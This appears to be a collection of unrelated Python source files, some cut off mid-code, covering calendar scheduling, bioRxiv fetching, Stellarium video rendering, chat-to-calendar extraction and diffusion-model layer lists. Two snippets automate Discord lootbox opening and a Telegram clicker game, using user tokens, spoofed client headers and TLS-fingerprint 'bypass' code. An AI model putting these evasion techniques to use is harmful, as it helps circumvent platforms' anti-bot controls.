    "import click\nimport caldav\nimport keyring\nimport taskw\nfrom zoneinfo import ZoneInfo\nfrom datetime import datetime\n\nfrom bujin_scheduler.synchronizer import TodoSynchronizer\nfrom .scheduler import SchedulerV1, SchedulerConfiguration, SchedulingPlan\nfrom .secrets import url, username, password\n\ndef find_calendar(calendar_id: str) -> caldav.Calendar:\n    with caldav.DAVClient(url=url, username=username, password=password) as client:\n        me = client.principal()\n        calendars = me.calendars()\n        target_calendar = None\n        for calendar in calendars:\n            if calendar.id == calendar_id:\n                target_calendar = calendar\n\n        if not target_calendar:\n            raise RuntimeError(f\"Calendar '{calendar_id}' not found!\")\n\n        return target_calendar\n\n\ndef compute_plan(calendar_id: str, constraint_calendar_ids: list[str]) -> SchedulingPlan:\n    click.echo('Generating a plan...')\n\n    today = datetime.now(ZoneInfo(\"Europe/Paris\"))\n    start = today.replace(day=today.day + 1, hour=10, minute=0, second=0, microsecond=0)\n\n    tasks = taskw.TaskWarrior(marshal=True)\n    scheduler = SchedulerV1(\n        SchedulerConfiguration(ideal_energy_level_per_day=100, planning_horizon=3, discretization_per_day=60, planning_range_per_day=(start, 16)),\n        find_calendar(calendar_id),\n        tasks\n    )\n    return scheduler.plan()\n\n\n\n@click.group()\ndef cli():\n    pass\n\n@cli.command()\n@click.option('--calendar-id', prompt='Your calendar ID?', help='Calendar ID for the scheduling calendar')\n@click.option('--constraint-calendar-id', help='Constraint calendar IDs for forbidden zone', default=[])\ndef plan(calendar_id: str, constraint_calendar_id: list[str]):\n    plan = compute_plan(calendar_id, constraint_calendar_id)\n    synchronizer = TodoSynchronizer(plan.planning, find_calendar(calendar_id))\n    synchronizer.plan().diagnose()\n\n@cli.command()\n@click.option('--calendar-id', prompt='Your calendar ID?', help='Calendar ID for the scheduling calendar')\n@click.option('--constraint-calendar-id', help='Constraint calendar IDs for forbidden zone', default=[])\ndef apply(calendar_id: str, constraint_calendar_id: list[str]):\n    target_calendar = find_calendar(calendar_id)\n    plan = compute_plan(calendar_id, constraint_calendar_id)\n    synchronizer = TodoSynchronizer(plan.planning, target_calendar)\n    synchronizer.plan().apply(target_calendar)\n\n\nif __name__ == '__main__':\n    cli()\n",
    "import pandas as pd\nimport numpy as np\nfrom pathlib import Path\nimport datetime\nimport requests\nimport json\nimport os\nfrom datetime import datetime\nfrom dateutil.relativedelta import relativedelta\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nimport pandas as pd\nimport os\nimport json\nfrom pathlib import Path\nfrom sentence_transformers import SentenceTransformer, models\nimport torch\nimport shutil\n\ndef load_data_embeddings():\n    existing_data_path = \"aggregated_data\"\n    new_data_directory = \"db_update\"\n    existing_embeddings_path = \"biorxiv_ubin_embaddings.npy\"\n    updated_embeddings_directory = \"embed_update\"\n\n    # Load existing database and embeddings\n    df_existing = pd.read_parquet(existing_data_path)\n    embeddings_existing = np.load(existing_embeddings_path, allow_pickle=True)\n\n    # Prepare lists to collect new updates\n    df_updates_list = []\n    embeddings_updates_list = []\n\n    # Ensure pairing of new data and embeddings by their matching filenames\n    new_data_files = sorted(Path(new_data_directory).glob(\"*.parquet\"))\n    for data_file in new_data_files:\n        # Assuming naming convention allows direct correlation\n        corresponding_embedding_file = Path(updated_embeddings_directory) / (\n            data_file.stem + \".npy\"\n        )\n\n        if corresponding_embedding_file.exists():\n            # Load and append DataFrame and embeddings\n            df_updates_list.append(pd.read_parquet(data_file))\n            embeddings_updates_list.append(np.load(corresponding_embedding_file))\n        else:\n            print(f\"No corresponding embedding file found for {data_file.name}\")\n\n    # Concatenate all updates\n    if df_updates_list:\n        df_updates = pd.concat(df_updates_list)\n    else:\n        df_updates = pd.DataFrame()\n\n    if embeddings_updates_list:\n        embeddings_updates = np.vstack(embeddings_updates_list)\n    else:\n        embeddings_updates = np.array([])\n\n    # Append new data to existing, handling duplicates as needed\n    df_combined = pd.concat([df_existing, df_updates])\n\n    # create a mask for filtering\n    mask = ~df_combined.duplicated(subset=[\"title\"], keep=\"last\")\n    df_combined = df_combined[mask]\n\n    # Combine embeddings, ensuring alignment with the DataFrame\n    embeddings_combined = (\n        np.vstack([embeddings_existing, embeddings_updates])\n        if embeddings_updates.size\n        else embeddings_existing\n    )\n\n    # filter the embeddings based on dataframe unique entries\n    embeddings_combined = embeddings_combined[mask]\n\n    return df_combined, embeddings_combined\n\n# Fast fetch data from bioRxiv\n\ndef fetch_and_save_data_block(endpoint, server, block_start, block_end, save_directory, format='json'):\n    base_url = f\"https://api.biorxiv.org/{endpoint}/{server}/\"\n    block_interval = f\"{block_start.strftime('%Y-%m-%d')}/{block_end.strftime('%Y-%m-%d')}\"\n    block_data = []\n    cursor = 0\n    continue_fetching = True\n\n    while continue_fetching:\n        url = f\"{base_url}{block_interval}/{cursor}/{format}\"\n        response = requests.get(url)\n\n        if response.status_code != 200:\n            print(f\"Failed to fetch data for block {block_interval} at cursor {cursor}. HTTP Status: {response.status_code}\")\n            break\n\n        data = response.json()\n        fetched_papers = len(data['collection'])\n\n        if fetched_papers > 0:\n            block_data.extend(data['collection'])\n            cursor += fetched_papers  # Update the cursor to fetch next set of data\n            print(f\"Fetched {fetched_papers} papers for block {block_interval}. Total fetched: {cursor}.\")\n        else:\n            continue_fetching = False\n\n    if block_data:\n        save_data_block(block_data, block_start, block_end, endpoint, save_directory)\n\ndef save_data_block(block_data, start_date, end_date, endpoint, save_directory):\n    start_yymmdd = start_date.strftime(\"%y%m%d\")\n    end_yymmdd = end_date.strftime(\"%y%m%d\")\n    filename = f\"{save_directory}/{endpoint}_data_{start_yymmdd}_{end_yymmdd}.json\"\n    \n    with open(filename, 'w') as file:\n        json.dump(block_data, file, indent=4)\n    \n    print(f\"Saved data block to {filename}\")\n\ndef fetch_data(endpoint, server, interval, save_directory, format='json'):\n    os.makedirs(save_directory, exist_ok=True)\n    start_date, end_date = [datetime.strptime(date, \"%Y-%m-%d\") for date in interval.split('/')]\n    current_date = start_date\n    tasks = []\n\n    with ThreadPoolExecutor(max_workers=12) as executor:  # Adjust the number of workers as needed\n        while current_date <= end_date:\n            block_start = current_date\n            block_end = min(current_date + relativedelta(months=1) - relativedelta(days=1), end_date)\n            tasks.append(executor.submit(fetch_and_save_data_block, endpoint, server, block_start, block_end, save_directory, format))\n            current_date += relativedelta(months=1)\n        \n        for future in as_completed(tasks):\n            future.result()\n\ndef load_json_to_datafram",
    "import tls_client\nimport time\nimport datetime\nimport os, random\n\nred = '\\x1b[31m(-)\\x1b[0m'\nblue = '\\x1b[34m(+)\\x1b[0m'\ngreen = '\\x1b[32m(+)\\x1b[0m'\nyellow = '\\x1b[33m(!)\\x1b[0m'\n\ndef get_timestamp():\n    time_idk = datetime.datetime.now().strftime('%H:%M:%S')\n    timestamp = f'[\\x1b[90m{time_idk}\\x1b[0m]'\n    return timestamp\n\nclass DiscordSession:\n    def __init__(self, client_identifier=\"chrome112\"):\n        self.session = tls_client.Session(client_identifier=client_identifier, random_tls_extension_order=True)\n\n    def post(self, url, headers):\n        return self.session.post(url, headers=headers)\n\nclass LootBoxOpener:\n    lootbox_items = {\n        \"1214340999644446726\": \"Quack!!\",\n        \"1214340999644446724\": \"\u2b95\u2b06\u2b07\u2b95\u2b06\u2b07\",\n        \"1214340999644446722\": \"Wump Shell\",\n        \"1214340999644446720\": \"Buster Blade\",\n        \"1214340999644446725\": \"Power Helmet\",\n        \"1214340999644446723\": \"Speed Boost\",\n        \"1214340999644446721\": \"Cute Plushie\",\n        \"1214340999644446728\": \"Dream Hammer\",\n        \"1214340999644446727\": \"OHHHHH BANANA\"\n    }\n\n    def __init__(self, discord_session, token):\n        self.discord_session = discord_session\n        self.token = token\n        self.headers = {\n            'authority': 'discord.com',\n            'accept': '*/*',\n            'accept-language': 'en-US',\n            'authorization': token,\n            'origin': 'https://discord.com',\n            'referer': 'https://discord.com/channels/1222747973205758002/1224417703100551169',\n            'sec-ch-ua': '\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"',\n            'sec-ch-ua-mobile': '?0',\n            'sec-ch-ua-platform': '\"Windows\"',\n            'sec-fetch-dest': 'empty',\n            'sec-fetch-mode': 'cors',\n            'sec-fetch-site': 'same-origin',\n            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9037 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36',\n            'x-debug-options': 'bugReporterEnabled',\n            'x-discord-locale': 'en-US',\n            'x-discord-timezone': 'Asia/Calcutta',\n            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDM3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MzEiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMzcgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyODA3MDAsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjQ1MzY5LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',\n        }\n\n    def open_lootbox(self):\n        response = self.discord_session.post('https://discord.com/api/v9/users/@me/lootboxes/open', headers=self.headers)\n        if 'rate limited' in response.text:\n            print(f\"{get_timestamp()} {yellow} You Are Being Rate Limited!\")\n            time.sleep(2)\n        elif response.status_code == 200:\n            opened_item = response.json().get('opened_item')\n            if opened_item in self.lootbox_items:\n                print(f\"{get_timestamp()} {green} Successfully Opened A Lootbox : {self.lootbox_items[opened_item]}\")\n                time.sleep(random.uniform(7, 10))\n            else:\n                print(f\"{get_timestamp()} {red} An Unknown Item Was Received.\")\n        else:\n            print(f'{get_timestamp()} {red} An Error Occurred : {response.status_code} - {response.text}')\n\ndef main():\n    token = input(f\"{get_timestamp()} {blue} Please Enter Your Account Token : \")\n    discord_session = DiscordSession()\n    lootbox_opener = LootBoxOpener(discord_session, token)\n    \n    while True:\n        lootbox_opener.open_lootbox()\n        time.sleep(1)\n\nif __name__ == \"__main__\":\n    os.system(\"cls\")\n    main()\n",
    "from skyfield import almanac\nfrom skyfield.api import load, wgs84\nfrom typing import Tuple\n\nimport argparse\nimport isodate\nimport re\nimport os\nimport os.path\n\nfrom datetime import datetime, date, timezone\nfrom pathlib import Path\nfrom geopy.geocoders import Nominatim\n\nimport subprocess\nimport time\nimport tempfile\nimport shutil\n\nversion = \"2.0.1\"\n\n\nclass Parameters:\n    def __init__(self, args: argparse.Namespace) -> None:\n        lonlat: list = args.loc[0]\n        city: str = args.loc[1]\n        view: list[float] = args.view\n\n        self.__az: float = view[0]\n        self.__alt: float = view[1]\n        self.__fov: float = view[2]\n        self.__lon: float = lonlat[0]\n        self.__lat: float = lonlat[1]\n        self.__city: str = city\n        self.__planet: str = args.planet\n        self.__caption: str = args.caption\n        self.__outfile: str = args.outfile\n        self.__timespan: float = args.timespan\n        self.__delta_t: float = args.dt\n        self.__fps: float = args.fps\n        self.__show_video: bool = args.show_video\n        self.__template: str = args.template\n        self.__start_date: datetime = self.__determine_start_time(args.date)\n        self.__video_size = args.video_size\n\n        self.__window_size: Tuple[int, int] | None\n        if args.window_size is None:\n            self.__window_size = None\n        else:\n            if 'x' not in args.window_size:\n                raise ValueError('The window size must be of the form \"1920x1080\"')\n\n            width_str, height_str = args.window_size.split('x')\n            self.__window_size = (int(width_str), int(height_str))\n\n    def __determine_start_time(self, date: datetime) -> datetime:\n        if date.hour == 0 and date.minute == 0 and date.second == 0 and self.planet == 'Earth':\n            self.__start_at_sunset = True\n\n            latlon = wgs84.latlon(self.lat, self.lon)\n            ts = load.timescale()\n            eph = load('de421.bsp')\n            observer = eph['Earth'] + latlon\n\n            t = ts.utc(date.year, date.month, date.day)\n            t0, t1 = t, ts.utc(t.utc[0], t.utc[1], t.utc[2], 24)\n            t_set, y_set = almanac.find_settings(observer, eph['Sun'], t0, t1)\n\n            if y_set[0] == False:\n                raise ValueError(\n                    f'You must specify a specific time because the location {self.lon},{self.lat} is experiencing either polar day or polar night! The script cannot compute a sunset time for this date: {date.isoformat()}.')\n\n            return t_set[0].utc_datetime()\n        else:\n            self.__start_at_sunset = False\n            return date\n\n    @property\n    def alt(self) -> float:\n        return self.__alt\n\n    @property\n    def az(self) -> float:\n        return self.__az\n\n    @property\n    def fov(self) -> float:\n        return self.__fov\n\n    @property\n    def lon(self) -> float:\n        return self.__lon\n\n    @property\n    def lat(self) -> float:\n        return self.__lat\n\n    @property\n    def city(self) -> str:\n        return self.__city\n\n    @property\n    def planet(self) -> str:\n        return self.__planet\n\n    @property\n    def start_date(self) -> datetime:\n        return self.__start_date\n\n    @property\n    def caption(self) -> str:\n        return self.__caption\n\n    @property\n    def outfile(self) -> str:\n        return self.__outfile\n\n    @property\n    def timespan(self) -> float:\n        return self.__timespan\n\n    @property\n    def delta_t(self) -> float:\n        return self.__delta_t\n\n    @property\n    def fps(self) -> float:\n        return self.__fps\n\n    @property\n    def show_video(self) -> bool:\n        return self.__show_video\n\n    @property\n    def start_at_sunset(self) -> bool:\n        return self.__start_at_sunset\n\n    @property\n    def template(self) -> str:\n        return self.__template\n\n    @property\n    def template_file(self) -> Path:\n        tempate_folder: Path = Path(os.path.dirname(os.path.realpath(__file__)))\n        return tempate_folder / 'script' / self.__template\n\n    @property\n    def video_size(self) -> str:\n        return self.__video_size\n\n    @property\n    def window_size(self) -> Tuple[int, int] | None:\n        return self.__window_size\n\n\nclass StellariumToVideo:\n    def __init__(self, param: Parameters) -> None:\n        tempPath: Path = Path(tempfile.gettempdir()) / 'kalstar_frames'\n        self.__frame_folder = tempPath\n        self.__final_file = self.__frame_folder / 'final.png'\n        self.__first_file = self.__frame_folder / 'first.png'\n        self.__param = param\n\n        # Create frame folder if it not already exists\n        if os.path.exists(str(self.__frame_folder)):\n            shutil.rmtree(str(self.__frame_folder))\n\n        os.mkdir(str(self.__frame_folder))\n\n    def create_script(self, script_path: Path) -> None:\n        with open(self.__param.template_file, 'r') as file:\n            script = file.read()\n\n        if os.name == 'nt':\n            script = script.replace(\"$FRAME_FOLDER$\", str(self.__frame_folder).replace(\"\\\\\", ",
    "import configparser\nfrom openai import OpenAI\nimport json\nfrom datetime import datetime, timedelta, timezone\nimport httpx\nimport os\n\n\nconfig_file_path = os.getenv('PA_CONFIG_PATH', './config.ini')\nconfig = configparser.ConfigParser()\nconfig.read(config_file_path, encoding='utf-8')\n\ndef analyze_chat(chat_content, openai_client=None, chat_model=\"gpt-3.5-turbo-1106\"):\n    \"\"\"\n    \u8c03\u7528ChatGPT API\u5206\u6790\u804a\u5929\u8bb0\u5f55\uff0c\u5e76\u63d0\u53d6\u5173\u952e\u4fe1\u606f\n    :param chat_content: \u804a\u5929\u5185\u5bb9\u7684\u5b57\u7b26\u4e32\n    :return: \u4e00\u4e2a\u5305\u542b\u63d0\u53d6\u51fa\u7684\u5173\u952e\u4fe1\u606f\u7684\u5b57\u5178\n    \"\"\"\n    if not openai_client:\n        if config[\"Connection\"].get(\"http_port\", None):\n            if config[\"Connection\"].get(\"proxy_username\", None):\n                http_proxy = f\"http://{config['Connection']['proxy_username']}:{config['Connection']['proxy_password']}@{config['Connection']['proxy']}:{config['Connection']['http_port']}\"\n            else:\n                http_proxy = f\"http://{config['Connection']['proxy']}:{config['Connection']['http_port']}\"\n            httpx_client = httpx.Client(proxies={\"http://\": http_proxy, \"https://\": http_proxy})\n        else:\n            httpx_client = None\n        openai_client = OpenAI(api_key=config[\"OpenAI\"][\"api_key\"], http_client=httpx_client)\n\n    # Check https://platform.openai.com/docs/models/gpt-3-5 for most updated model name\n    completion = openai_client.chat.completions.create(\n        model=chat_model,\n        messages=[{\"role\": \"user\", \"content\": generate_prompt(chat_content)}],\n        timeout=60,\n        response_format= { \"type\":\"json_object\" }\n    )\n\n    text = completion.choices[0].message.content\n    # \u89e3\u6790text\u4ee5\u63d0\u53d6\u9700\u8981\u7684\u4fe1\u606f\n    info = parse_info(text)\n    \n    return info\n\ndef generate_prompt(chat_content):\n    \"\"\"\n    \u6839\u636e\u804a\u5929\u5185\u5bb9\u751f\u6210\u9002\u5408ChatGPT\u7684\u63d0\u793a\u8bed\n    :param chat_content: \u539f\u59cb\u7684\u804a\u5929\u5185\u5bb9\u5b57\u7b26\u4e32\n    :return: \u751f\u6210\u7684\u63d0\u793a\u8bed\n    \"\"\"\n    now = datetime.now()\n    date_time_str = now.strftime(\"%Y-%m-%d %H:%M:%S\")\n\n    return f\"\u8bf7\u6839\u636e\u4ee5\u4e0b\u804a\u5929\u8bb0\u5f55\u63d0\u53d6\u4f1a\u8bae\u7684\u5173\u952e\u4fe1\u606f\uff0c\u76ee\u524d\u65f6\u95f4\u662f{date_time_str}, \u5e76\u4ee5JSON\u683c\u5f0f\u8f93\u51fa: \\n\\n{chat_content}\\n\\n\" + \"\"\"\u671f\u671b\u7684\u8f93\u51fa\u683c\u5f0f\u5982\u4e0b\uff1a{\n  \"summary\": \uff08\u6839\u636e\u804a\u5929\u5185\u5bb9\u63d0\u53d6\u65e5\u7a0b\u4e3b\u9898\uff0c\u9700\u8981\u5305\u542b\u3010\u53c2\u4e0e\u5bf9\u8c61\u3011\u3001\u3010\u505a\u4ec0\u4e48\u4e8b\u3011\u7b49\uff0c\u4f8b\u5982\u201c\u548cXXX\u4e00\u8d77\u505aXXX\u201d\uff09,\n  \"start_time\": \uff08\u63d0\u53d6\u5f00\u59cb\u65f6\u95f4\uff0c\u683c\u5f0f\u4e3aYYYY-MM-DD HH:MM, \u5982\u679c\u65f6\u95f4\u6ca1\u6709\u5177\u4f53\u5230\u5c0f\u65f6\u548c\u5206\u949f\uff0c\u5219\u5047\u5b9a\u4e3a\u5f53\u5929\u76849:00\uff09,\n  \"duration\": \uff08\u6301\u7eed\u65f6\u957f\uff0c\u5355\u4f4d\u4e3a\u5206\u949f\uff0c\u5982\u679c\u6ca1\u6709\u8bf4\u660e\u65f6\u95f4\uff0c\u5219\u6839\u636e\u7c7b\u522b\u9009\u62e9\uff0c\u4f1a\u8bae\u9ed8\u8ba4\u4e3a60\u5206\u949f\u3001\u5403\u996d\u9ed8\u8ba42\u5c0f\u65f6\u3001\u63d0\u9192\u5219\u9ed8\u8ba4\u4e3a15\u5206\u949f\uff09,\n  \"attendees\": \uff08\u53c2\u4f1a\u8005\uff0c\u6240\u6709\u63d0\u5230\u7684\u540d\u5b57\u90fd\u88ab\u5217\u4e3a\u53c2\u4f1a\u8005\uff0c\u4e0d\u7528\u5305\u542b\u81ea\u5df1\uff0c\u8bf7\u8ba4\u771f\u7504\u522b\uff09,\n  \"location\": \uff08\u53c2\u4f1a\u5730\u5740\u6216\u8005\u6240\u7528\u4f1a\u8bae\u5de5\u5177\uff0c\u5982Zoom\u3001\u817e\u8baf\u4f1a\u8bae\u3001\u5fae\u4fe1\u8bed\u97f3\u3001\u7535\u8bdd\u53f7\u7801\u7b49\uff0c\u5982\u679c\u672a\u63d0\u53ca\uff0c\u5219\u8f93\u51fa''\uff09,\n  \"is_meeting\": (\u6839\u636e\u4fe1\u606f\u5224\u65ad\u662f\u5426\u53ef\u4ee5\u6d89\u53ca\u65e5\u7a0b\u6216\u8005\u63d0\u9192\uff0c\u6ee1\u8db3\u5176\u4e00\u5219\u56de\u590dTrue\uff0c\u5426\u5219False),\n}\n\u8bf7\u8f93\u51fa\uff1a\n\"\"\"\n\ndef parse_info(text):\n    \"\"\"\n    \u89e3\u6790ChatGPT\u8fd4\u56de\u7684\u6587\u672c\uff0c\u63d0\u53d6\u5173\u952e\u4fe1\u606f\n    :param text: ChatGPT\u8fd4\u56de\u7684\u6587\u672c\n    :return: \u4e00\u4e2a\u5305\u542b\u63d0\u53d6\u51fa\u7684\u5173\u952e\u4fe1\u606f\u7684\u5b57\u5178\n    \"\"\"\n    info = json.loads(text)\n    info[\"start_time\"] = datetime.strptime(info[\"start_time\"], \"%Y-%m-%d %H:%M\")\n    # \u5982\u679c\u662f\u51cc\u66684\u70b9\u4e4b\u524d\uff0c\u5219\u5728\u5f00\u59cb\u65f6\u95f4\u4e0a\u63d0\u524d\u4e00\u5929\n    if datetime.now().hour < 4:\n        info[\"start_time\"] = info[\"start_time\"] - timedelta(days=1)\n    # \u5982\u679c\u5f00\u59cb\u65f6\u95f4\u665a\u4e8e\u5f53\u524d\u65f6\u95f4\uff0c\u5219\u9009\u62e9\u5f53\u524d\u65f6\u95f4\u540e1\u4e00\u5c0f\u65f6\u7684\u6574\u70b9\u5f00\u59cb\n    if info[\"start_time\"] < datetime.now():\n        info[\"start_time\"] = datetime.now().replace(minute=0, second=0, microsecond=0) + timedelta(hours=1)\n    \n    # \u6307\u5b9a\u4e3a\u56fd\u5185\u65f6\u533a\uff08\u672a\u6765\u589e\u52a0\u65f6\u533a\u611f\u77e5\uff09\n    tz_utc_8 = timezone(timedelta(hours=8))\n    info[\"start_time\"] = info[\"start_time\"].replace(tzinfo=tz_utc_8)\n    info[\"duration\"] = timedelta(minutes=info[\"duration\"])\n    info[\"body\"] = text\n    return info\n\n# \u793a\u4f8b\u4f7f\u7528\nif __name__ == \"__main__\":\n    chat_content = \"\u6211\u548c\u5ed6\u99a8\u7476\u660e\u5929\u4e0b\u53482\u70b9\u4e00\u8d77\u8ba8\u8bba\u65e5\u672c\u884c\u7a0b\u7684\u5177\u4f53\u7ec6\u8282\u3002\"\n    info = analyze_chat(chat_content)\n    print(info)\n    ",
    "# T_references for training size (512)\nTref = {\n    \"down_blocks.0.attentions.0.transformer_blocks.0.attn1.processor\": {4096},\n    \"down_blocks.0.attentions.0.transformer_blocks.0.attn2.processor\": {77},\n    \"down_blocks.0.attentions.1.transformer_blocks.0.attn1.processor\": {4096},\n    \"down_blocks.0.attentions.1.transformer_blocks.0.attn2.processor\": {77},\n    \"down_blocks.1.attentions.0.transformer_blocks.0.attn1.processor\": {1024},\n    \"down_blocks.1.attentions.0.transformer_blocks.0.attn2.processor\": {77},\n    \"down_blocks.1.attentions.1.transformer_blocks.0.attn1.processor\": {1024},\n    \"down_blocks.1.attentions.1.transformer_blocks.0.attn2.processor\": {77},\n    \"down_blocks.2.attentions.0.transformer_blocks.0.attn1.processor\": {256},\n    \"down_blocks.2.attentions.0.transformer_blocks.0.attn2.processor\": {77},\n    \"down_blocks.2.attentions.1.transformer_blocks.0.attn1.processor\": {256},\n    \"down_blocks.2.attentions.1.transformer_blocks.0.attn2.processor\": {77},\n    \"mid_block.attentions.0.transformer_blocks.0.attn1.processor\": {64},\n    \"mid_block.attentions.0.transformer_blocks.0.attn2.processor\": {77},\n    \"up_blocks.1.attentions.0.transformer_blocks.0.attn1.processor\": {256},\n    \"up_blocks.1.attentions.0.transformer_blocks.0.attn2.processor\": {77},\n    \"up_blocks.1.attentions.1.transformer_blocks.0.attn1.processor\": {256},\n    \"up_blocks.1.attentions.1.transformer_blocks.0.attn2.processor\": {77},\n    \"up_blocks.1.attentions.2.transformer_blocks.0.attn1.processor\": {256},\n    \"up_blocks.1.attentions.2.transformer_blocks.0.attn2.processor\": {77},\n    \"up_blocks.2.attentions.0.transformer_blocks.0.attn1.processor\": {1024},\n    \"up_blocks.2.attentions.0.transformer_blocks.0.attn2.processor\": {77},\n    \"up_blocks.2.attentions.1.transformer_blocks.0.attn1.processor\": {1024},\n    \"up_blocks.2.attentions.1.transformer_blocks.0.attn2.processor\": {77},\n    \"up_blocks.2.attentions.2.transformer_blocks.0.attn1.processor\": {1024},\n    \"up_blocks.2.attentions.2.transformer_blocks.0.attn2.processor\": {77},\n    \"up_blocks.3.attentions.0.transformer_blocks.0.attn1.processor\": {4096},\n    \"up_blocks.3.attentions.0.transformer_blocks.0.attn2.processor\": {77},\n    \"up_blocks.3.attentions.1.transformer_blocks.0.attn1.processor\": {4096},\n    \"up_blocks.3.attentions.1.transformer_blocks.0.attn2.processor\": {77},\n    \"up_blocks.3.attentions.2.transformer_blocks.0.attn1.processor\": {4096},\n    \"up_blocks.3.attentions.2.transformer_blocks.0.attn2.processor\": {77},\n}\n\nlist_layers = [\n    \"down_blocks.1.attentions.0.transformer_blocks.0.attn1\",\n    \"down_blocks.1.attentions.0.transformer_blocks.0.attn2\",\n    \"down_blocks.1.attentions.0.transformer_blocks.1.attn1\",\n    \"down_blocks.1.attentions.0.transformer_blocks.1.attn2\",\n    \"down_blocks.1.attentions.1.transformer_blocks.0.attn1\",\n    \"down_blocks.1.attentions.1.transformer_blocks.0.attn2\",\n    \"down_blocks.1.attentions.1.transformer_blocks.1.attn1\",\n    \"down_blocks.1.attentions.1.transformer_blocks.1.attn2\",\n    \"down_blocks.2.attentions.0.transformer_blocks.0.attn1\",\n    \"down_blocks.2.attentions.0.transformer_blocks.0.attn2\",\n    \"down_blocks.2.attentions.0.transformer_blocks.1.attn1\",\n    \"down_blocks.2.attentions.0.transformer_blocks.1.attn2\",\n    \"down_blocks.2.attentions.0.transformer_blocks.2.attn1\",\n    \"down_blocks.2.attentions.0.transformer_blocks.2.attn2\",\n    \"down_blocks.2.attentions.0.transformer_blocks.3.attn1\",\n    \"down_blocks.2.attentions.0.transformer_blocks.3.attn2\",\n    \"down_blocks.2.attentions.0.transformer_blocks.4.attn1\",\n    \"down_blocks.2.attentions.0.transformer_blocks.4.attn2\",\n    \"down_blocks.2.attentions.0.transformer_blocks.5.attn1\",\n    \"down_blocks.2.attentions.0.transformer_blocks.5.attn2\",\n    \"down_blocks.2.attentions.0.transformer_blocks.6.attn1\",\n    \"down_blocks.2.attentions.0.transformer_blocks.6.attn2\",\n    \"down_blocks.2.attentions.0.transformer_blocks.7.attn1\",\n    \"down_blocks.2.attentions.0.transformer_blocks.7.attn2\",\n    \"down_blocks.2.attentions.0.transformer_blocks.8.attn1\",\n    \"down_blocks.2.attentions.0.transformer_blocks.8.attn2\",\n    \"down_blocks.2.attentions.0.transformer_blocks.9.attn1\",\n    \"down_blocks.2.attentions.0.transformer_blocks.9.attn2\",\n    \"down_blocks.2.attentions.1.transformer_blocks.0.attn1\",\n    \"down_blocks.2.attentions.1.transformer_blocks.0.attn2\",\n    \"down_blocks.2.attentions.1.transformer_blocks.1.attn1\",\n    \"down_blocks.2.attentions.1.transformer_blocks.1.attn2\",\n    \"down_blocks.2.attentions.1.transformer_blocks.2.attn1\",\n    \"down_blocks.2.attentions.1.transformer_blocks.2.attn2\",\n    \"down_blocks.2.attentions.1.transformer_blocks.3.attn1\",\n    \"down_blocks.2.attentions.1.transformer_blocks.3.attn2\",\n    \"down_blocks.2.attentions.1.transformer_blocks.4.attn1\",\n    \"down_blocks.2.attentions.1.transformer_blocks.4.attn2\",\n    \"down_blocks.2.attentions.1.transformer_blocks.5.attn1\",\n    \"down_blocks.2.attentions.1.transformer_blocks.5.attn2\",\n    \"down_blocks.2.attentions.1.transformer_bloc",
    "import asyncio\nfrom telethon.sync import TelegramClient\nfrom telethon.sync import functions, types, events\n\nimport json, requests, urllib, time, aiocron, random, ssl\n\n# -----------\nwith open('config.json') as f:\n    data = json.load(f)\n    api_id = data['api_id']\n    api_hash = data['api_hash']\n    admin = data['admin']\n\ndb = {\n    'click': 'on'\n}\n\nVERSION = \"1.0\"\nSTART_TIME = time.time()\n\nclient = TelegramClient('bot', api_id, api_hash, device_model=f\"TapSwap Clicker V{VERSION}\")\nclient.start()\nclient_id = client.get_me(True).user_id\n\n\nprint(\"Client is Ready ;)\")\n\n# -----------\n\nclass BypassTLSv1_3(requests.adapters.HTTPAdapter):\n    SUPPORTED_CIPHERS = [\n        \"ECDHE-ECDSA-AES128-GCM-SHA256\", \"ECDHE-RSA-AES128-GCM-SHA256\",\n        \"ECDHE-ECDSA-AES256-GCM-SHA384\", \"ECDHE-RSA-AES256-GCM-SHA384\",\n        \"ECDHE-ECDSA-CHACHA20-POLY1305\", \"ECDHE-RSA-CHACHA20-POLY1305\",\n        \"ECDHE-RSA-AES128-SHA\", \"ECDHE-RSA-AES256-SHA\",\n        \"AES128-GCM-SHA256\", \"AES256-GCM-SHA384\", \"AES128-SHA\", \"AES256-SHA\", \"DES-CBC3-SHA\",\n        \"TLS_AES_128_GCM_SHA256\", \"TLS_AES_256_GCM_SHA384\", \"TLS_CHACHA20_POLY1305_SHA256\",\n        \"TLS_AES_128_CCM_SHA256\", \"TLS_AES_256_CCM_8_SHA256\"\n    ]\n\n    def __init__(self, *args, **kwargs):\n        self.ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n        self.ssl_context.set_ciphers(':'.join(BypassTLSv1_3.SUPPORTED_CIPHERS))\n        self.ssl_context.set_ecdh_curve(\"prime256v1\")\n        self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_3\n        self.ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3\n        super().__init__(*args, **kwargs)\n\n    def init_poolmanager(self, *args, **kwargs):\n        kwargs[\"ssl_context\"] = self.ssl_context\n        kwargs[\"source_address\"] = None\n        return super().init_poolmanager(*args, **kwargs)\n\n    def proxy_manager_for(self, *args, **kwargs):\n        kwargs[\"ssl_context\"] = self.ssl_context\n        kwargs[\"source_address\"] = None\n        return super().proxy_manager_for(*args, 